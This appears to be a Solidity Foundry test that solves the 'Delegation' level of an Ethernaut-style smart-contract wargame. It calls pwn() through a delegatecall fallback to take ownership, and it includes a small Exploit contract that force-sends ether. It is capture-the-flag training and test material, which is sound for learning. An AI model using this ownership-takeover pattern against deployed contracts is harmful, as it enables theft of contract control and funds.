// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/Delegation.sol";
import "../src/levels/DelegationFactory.sol";
import "./utils/BaseTest.sol";

contract TestDelegation is BaseTest{
    Delegation level;

    constructor() public{
        levelFactory = new DelegationFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance(true));
        level = Delegation(levelAddress);

        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override{
        vm.startPrank(player);
        
        (bool success,) = address(level).call(abi.encodeWithSignature("pwn()"));
        require(success,"Attack Failed");
        assertEq(level.owner(),player);

        vm.stopPrank();
    }
}

contract Exploit{
    constructor(address payable _contract) payable public{
        (bool success,) = address(_contract).call{value:msg.value}("");
        require(success,"eth transfer failed");
    }
}